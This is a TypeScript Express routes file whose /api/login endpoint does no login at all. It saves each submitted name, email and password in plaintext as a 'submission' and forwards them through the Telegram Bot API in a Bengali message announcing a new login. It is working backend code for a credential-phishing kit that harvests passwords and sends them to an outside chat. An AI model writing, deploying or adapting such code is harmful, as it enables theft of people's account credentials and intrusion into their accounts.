import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertSubmissionSchema } from "@shared/schema";

async function sendToTelegram(name: string, email: string, password: string): Promise<boolean> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.log("Telegram credentials not configured");
    return false;
  }

  const message = `🔔 নতুন লগইন!\n\n👤 নাম: ${name}\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}\n\n⏰ সময়: ${new Date().toLocaleString("bn-BD")}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const result = await response.json();
    return result.ok;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  app.post("/api/login", async (req, res) => {
    try {
      const parsed = insertSubmissionSchema.safeParse(req.body);
      
      if (!parsed.success) {
        return res.status(400).json({ error: "Invalid data" });
      }

      const { name, email, password } = parsed.data;

      // Save to database
      const submission = await storage.createSubmission({ name, email, password });

      // Send to Telegram
      await sendToTelegram(name, email, password);

      res.json({ success: true, id: submission.id });
    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  return httpServer;
}
